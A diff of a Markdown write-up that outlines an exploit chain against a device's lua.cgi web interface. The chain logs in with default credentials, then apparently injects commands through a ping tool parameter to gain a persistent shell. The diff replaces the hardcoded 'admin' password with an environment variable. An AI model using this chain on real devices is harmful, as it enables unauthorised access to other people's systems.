@@ -9,7 +9,7 @@ a one-shot injection into a persistent shell.
 ## The chain
 
 ```
- ┌──────────────────────┐   cmd=100, admin/admin
+ ┌──────────────────────┐   cmd=100, admin + known password
  │  POST /cgi-bin/lua.cgi│──────────────────────► valid sessionId
  └──────────┬───────────┘
             │  cmd=145, tool=ping_start,
@@ -28,7 +28,7 @@ a one-shot injection into a persistent shell.
 **1 — Log in**
 
 ```powershell
-& scripts/web-login.ps1 -Password 'admin' -OutFile .\sid.txt
+& scripts/web-login.ps1 -Password $env:P11_WEB_PASS -OutFile .\sid.txt
 # → SESSION: <sid>
 ```
 
